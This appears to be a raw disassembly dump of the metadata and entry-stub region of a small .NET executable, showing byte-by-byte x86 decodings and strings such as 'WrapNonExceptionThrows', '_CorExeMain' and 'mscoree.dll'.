  402b55:	00 01                	add    %al,(%ecx)
  402b57:	05 00 01 1d 05       	add    $0x51d0100,%eax
  402b5c:	0e                   	push   %cs
  402b5d:	06                   	push   %es
  402b5e:	00 01                	add    %al,(%ecx)
  402b60:	1d 05 1d 05 04       	sbb    $0x4051d05,%eax
  402b65:	20 01                	and    %al,(%ecx)
  402b67:	01 08                	add    %ecx,(%eax)
  402b69:	0a 00                	or     (%eax),%al
  402b6b:	04 11                	add    $0x11,%al
  402b6d:	15 0e 0e 11 19       	adc    $0x19110e0e,%eax
  402b72:	11 1d 03 00 00 0e    	adc    %ebx,0xe000003
  402b78:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  402b7d:	0e                   	push   %cs
  402b7e:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402b83:	0e                   	push   %cs
  402b84:	04 00                	add    $0x0,%al
  402b86:	01 02                	add    %eax,(%edx)
  402b88:	0e                   	push   %cs
  402b89:	06                   	push   %es
  402b8a:	00 02                	add    %al,(%edx)
  402b8c:	01 0e                	add    %ecx,(%esi)
  402b8e:	11 31                	adc    %esi,(%ecx)
  402b90:	04 00                	add    $0x0,%al
  402b92:	01 01                	add    %eax,(%ecx)
  402b94:	0e                   	push   %cs
  402b95:	06                   	push   %es
  402b96:	00 02                	add    %al,(%edx)
  402b98:	01 0e                	add    %ecx,(%esi)
  402b9a:	1d 05 04 20 01       	sbb    $0x1200405,%eax
  402b9f:	01 0e                	add    %ecx,(%esi)
  402ba1:	04 20                	add    $0x20,%al
  402ba3:	01 01                	add    %eax,(%ecx)
  402ba5:	02 06                	add    (%esi),%al
  402ba7:	00 01                	add    %al,(%ecx)
  402ba9:	12 3d 12 35 03 20    	adc    0x20033512,%bh
  402baf:	00 08                	add    %cl,(%eax)
  402bb1:	04 00                	add    $0x0,%al
  402bb3:	01 01                	add    %eax,(%ecx)
  402bb5:	08 0b                	or     %cl,(%ebx)
  402bb7:	07                   	pop    %es
  402bb8:	05 0e 12 35 12       	add    $0x1235120e,%eax
  402bbd:	3d 12 35 1d 0e       	cmp    $0xe1d3512,%eax
  402bc2:	04 00                	add    $0x0,%al
  402bc4:	00 12                	add    %dl,(%edx)
  402bc6:	45                   	inc    %ebp
  402bc7:	05 20 01 12 49       	add    $0x49120120,%eax
  402bcc:	0e                   	push   %cs
  402bcd:	05 20 01 01 12       	add    $0x12010120,%eax
  402bd2:	49                   	dec    %ecx
  402bd3:	04 20                	add    $0x20,%al
  402bd5:	00 1d 05 08 07 03    	add    %bl,0x3070805
  402bdb:	12 49 12             	adc    0x12(%ecx),%cl
  402bde:	4d                   	dec    %ebp
  402bdf:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  402be4:	01 1d 05 07 20 02    	add    %ebx,0x2200705
  402bea:	01 12                	add    %edx,(%edx)
  402bec:	49                   	dec    %ecx
  402bed:	11 55 0a             	adc    %edx,0xa(%ebp)
  402bf0:	07                   	pop    %es
  402bf1:	04 12                	add    $0x12,%al
  402bf3:	4d                   	dec    %ebp
  402bf4:	12 51 12             	adc    0x12(%ecx),%dl
  402bf7:	4d                   	dec    %ebp
  402bf8:	1d 05 04 20 00       	sbb    $0x200405,%eax
  402bfd:	12 59 03             	adc    0x3(%ecx),%bl
  402c00:	20 00                	and    %al,(%eax)
  402c02:	0e                   	push   %cs
  402c03:	08 01                	or     %al,(%ecx)
  402c05:	00 08                	add    %cl,(%eax)
  402c07:	00 00                	add    %al,(%eax)
  402c09:	00 00                	add    %al,(%eax)
  402c0b:	00 1e                	add    %bl,(%esi)
  402c0d:	01 00                	add    %eax,(%eax)
  402c0f:	01 00                	add    %eax,(%eax)
  402c11:	54                   	push   %esp
  402c12:	02 16                	add    (%esi),%dl
  402c14:	57                   	push   %edi
  402c15:	72 61                	jb     0x402c78
  402c17:	70 4e                	jo     0x402c67
  402c19:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  402c1b:	45                   	inc    %ebp
  402c1c:	78 63                	js     0x402c81
  402c1e:	65 70 74             	gs jo  0x402c95
  402c21:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402c28:	77 73                	ja     0x402c9d
  402c2a:	01 00                	add    %eax,(%eax)
  402c2c:	54                   	push   %esp
  402c2d:	2c 00                	sub    $0x0,%al
	...
  402c37:	00 6e 2c             	add    %ch,0x2c(%esi)
  402c3a:	00 00                	add    %al,(%eax)
  402c3c:	00 20                	add    %ah,(%eax)
	...
  402c52:	00 00                	add    %al,(%eax)
  402c54:	60                   	pusha
  402c55:	2c 00                	sub    $0x0,%al
	...
  402c5f:	00 00                	add    %al,(%eax)
  402c61:	00 5f 43             	add    %bl,0x43(%edi)
  402c64:	6f                   	outsl  %ds:(%esi),(%dx)
  402c65:	72 45                	jb     0x402cac
  402c67:	78 65                	js     0x402cce
  402c69:	4d                   	dec    %ebp
  402c6a:	61                   	popa
  402c6b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402c72:	72 65                	jb     0x402cd9
  402c74:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402c78:	6c                   	insb   (%dx),%es:(%edi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 00                	add    %al,(%eax)
  402c7d:	00 ff                	add    %bh,%bh
  402c7f:	25 00 20 40 00       	and    $0x402000,%eax
